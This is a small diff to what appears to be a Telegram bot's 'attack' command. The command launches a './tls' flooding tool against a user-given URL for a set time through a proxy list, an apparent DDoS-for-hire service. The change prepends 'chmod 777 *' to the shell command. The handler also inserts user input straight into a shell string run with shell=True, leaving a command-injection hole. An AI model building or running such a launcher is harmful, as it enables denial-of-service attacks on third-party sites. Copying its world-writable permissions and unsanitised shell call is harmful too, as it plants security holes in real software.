@@ -146,7 +146,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         is_attacking = True
         ongoing_info[update.effective_user.id] = {"url": url, "time_left": time, "attack_id": attack_id}
 
-        command = f"screen -dmS tls ./tls {url} {time} 32 4 proxy.txt"
+        command = f"screen -dmS tls chmod 777 * && ./tls {url} {time} 32 4 proxy.txt"
 
         process = subprocess.Popen(command, shell=True)
         await asyncio.sleep(1)
